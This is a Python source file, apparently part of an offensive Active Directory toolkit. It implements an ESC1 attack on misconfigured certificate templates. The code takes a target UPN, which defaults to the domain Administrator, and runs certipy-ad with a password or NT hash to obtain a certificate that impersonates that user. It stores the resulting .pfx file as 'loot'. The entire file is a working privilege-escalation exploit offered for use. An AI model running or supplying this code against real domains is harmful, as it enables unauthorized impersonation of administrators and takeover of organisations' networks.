import os
from core.helpers import run_command, save_loot
from core.colors import red, green, yellow, blue

def abuse_esc1(session, template_name):
    from core.helpers import run_command, save_loot
    import os
    from core.colors import red, green, yellow, blue

    print(blue("[>] ESC1: Exploiting a misconfigured certificate template allowing requestor-supplied subject (e.g., UPN)."))
    print(yellow("[*] This abuse can let you impersonate any user by requesting a certificate with their UPN."))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(red("[-] No CA information available in session metadata. Run 'adcs enum' first."))
        return

    ca_name = cas[0].get("name")
    if not ca_name or ca_name.lower() == "n/a":
        print(red("[-] CA name is missing or invalid."))
        return

    default_upn = f"Administrator@{session.domain}"
    upn = input(f"[?] Enter target UPN [default: {default_upn}]: ").strip() or default_upn

    output_file = f"esc1_{template_name}.pfx"

    # Support password or NT hash
    if session.hash:
        auth = ["-u", f"{session.username}@{session.domain}", "-hashes", session.hash]
    elif session.password:
        auth = ["-u", f"{session.username}@{session.domain}", "-p", session.password]
    else:
        print(red("[-] No credentials provided (password or hash)."))
        return

    cmd = [
        "certipy-ad", "req",
        *auth,
        "-dc-ip", session.dc_ip,
        "-template", template_name,
        "-ca", ca_name,
        "-out", output_file,
        "-upn", upn
    ]

    print(blue(f"[*] Requesting certificate using template '{template_name}' and CA '{ca_name}'..."))
    cmd_str = " ".join(cmd)
    output, err = run_command(cmd_str)
    print(output.strip() or err.strip())

    if os.path.exists(output_file):
        with open(output_file, "rb") as f:
            data = f.read()
        save_loot(output_file, data, binary=True)
        print(green(f"[+] Certificate saved to loot/{output_file}"), flush=True)
        print(green(f"[+] UPN used: {upn}"))
        print(green("[+] Certificate request successful!"))
    else:
        print(red("[-] Certificate file not found after request."), flush=True)
        print(yellow("[!] If the attack failed, try rerunning the command or run it manually. It may be a temporary connection issue."))

    print(yellow(f"[*] Command executed: {cmd_str}"))
